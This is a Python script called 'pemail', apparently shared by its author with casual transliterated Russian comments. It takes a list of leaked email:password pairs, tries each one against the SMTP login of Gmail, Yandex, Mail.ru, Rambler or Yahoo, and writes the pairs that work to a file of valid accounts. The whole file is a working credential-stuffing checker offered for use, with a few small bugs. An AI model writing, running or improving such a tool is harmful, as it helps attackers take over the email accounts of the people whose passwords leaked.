#!/usr/bin/env python3
# -*- coding: latin_1 -*-

#========================
#                       |
# pemail v1.0           |
# Made by dserlf        |
#                       |
#========================

import smtplib
import time
import re, os, sys

class pemail():
    def __init__(self):
        self.login = ''
        self.password = ''
        self.p_res = ''
        self.file = ''
        self.clean_file = ''
        self.smtp_dic = {
                    #Gmail rabotaet zaebis'
                    'gmail.com' : 'smtp.gmail.com:587',
                    #ne rabotaet; Mozete proverit' s drygimi pochtovimi servisami.
                    'yandex.ru' : 'smtp.yandex.ru:587',
                    'mail.ru'   : 'smtp.mail.ru:465',
                    'rambler.ru': 'smtp.rambler.ru:465',
                    'yahoo.com' : 'smtp.mail.yahoo.com:465'
        }

    def hello(self):
        print('Welcome to pemail.py')
        print('ver 1.0')
        print('=' * 7)
        print('Usage: python3 pemail.py [file_to_parse]')
        print('Example: python3 pemail.py gmail_base.txt')

    def init_name(self):
        if len(sys.argv) != 2:
            hello()
            sys.exit()
        self.file = sys.argv[1]
        if self.file.split('.')[1] != 'txt':
            hello()
            sys.exit()

    def cleanFile(self):
        #delete uncorrect lines in file
        print('[+] Cleaning the file...')
        self.clean_file = self.file.split('.')[0] + '_CLEANED.txt'
        open_f = open(self.file, mode='r', encoding='latin_1')
        open_cf = open(self.clean_file, mode='w', encoding='latin_1')
        pattern = r"[\w.-]+@+[A-Za-z]+.[A-Za-z-]+:[\w\W]+"
        for line in open_f:
            correct_line = re.search(pattern, line)
            if correct_line:
                open_cf.write(line)
            else:
                pass
        print('[+] File was cleaned sucsessfully\n\n')
        open_f.close()
        open_cf.close()
        return(self.clean_file)

    def checkValid(self):
        valid_file = open('VALID_EMAILS_{0}.txt'.format(time.strftime("%H%M%S", time.localtime())), mode='w+', encoding='latin_1')
        #grab login:pas from file
        print('[+] Starting work with {0}'.format(self.clean_file))
        with open(self.clean_file, mode='r', encoding='latin_1') as f:
            for line_number, line in enumerate(f):
                data = line.split(':')
                self.login = data[0]
                self.password = data[1]
                #valid check
                smtp_check = self.login.split('@')[1]
                for name, smtp in self.smtp_dic.items():
                    if smtp_check == name:
                        smtp_host = smtp.split(':')[0]
                        smtp_tls_port = smtp.split(':')[1]
                server = smtplib.SMTP(smtp_host, smtp_tls_port)
                server.starttls()
                try:
                    server.login(self.login, self.password)
                    self.p_res = '[+] Email is VALID! Line {0}; {1}'.format(line_number, line)
                    print(self.p_res)
                    valid_file.write(self.p_res)
                except smtplib.SMTPAuthenticationError:
                    date = time.strftime("%H:%M:%S", time.localtime())
                    print('[{0}] Line {1} -- Email is not valid'.format(date, line_number))
        valid_file.close()
        os.remove(self.clean_file)



parser = pemail()
parser.hello()
try:
    parser.init_name()
    parser.cleanFile()
    parser.checkValid()
    print('\n[+] Program has fineshed the work.')
    print('[+] Check file VALID_EMAILS_*.txt')
    print('\nThanks for using my script! :)')
except:
    print('[+] Program has finished the work')
    sys.exit()
